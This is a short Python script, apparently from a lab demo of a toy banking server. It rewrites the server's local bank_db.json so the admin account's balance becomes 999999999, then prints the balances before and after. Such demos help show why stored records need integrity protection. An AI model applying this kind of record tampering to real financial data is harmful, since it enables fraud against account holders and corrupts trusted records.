# attack_tamper_db.py
import json
import os

DB_FILE = "bank_db.json"

if not os.path.exists(DB_FILE):
    print("[!] File not found. Start the server first and make at least one transfer.")
    raise SystemExit(1)

with open(DB_FILE, "r", encoding="utf-8") as f:
    data = json.load(f)

print("Before:")
for u in data["users"]:
    print(f"  {u['login']:8} balance={u['balance']}")

for u in data["users"]:
    if u["login"] == "admin":
        u["balance"] = "999999999"

with open(DB_FILE, "w", encoding="utf-8") as f:
    json.dump(data, f, ensure_ascii=False, indent=2)

print("\nAfter:")
for u in data["users"]:
    print(f"  {u['login']:8} balance={u['balance']}")

print("\n[+] Done. The server needs a restart (or wait until it saves on its own).")
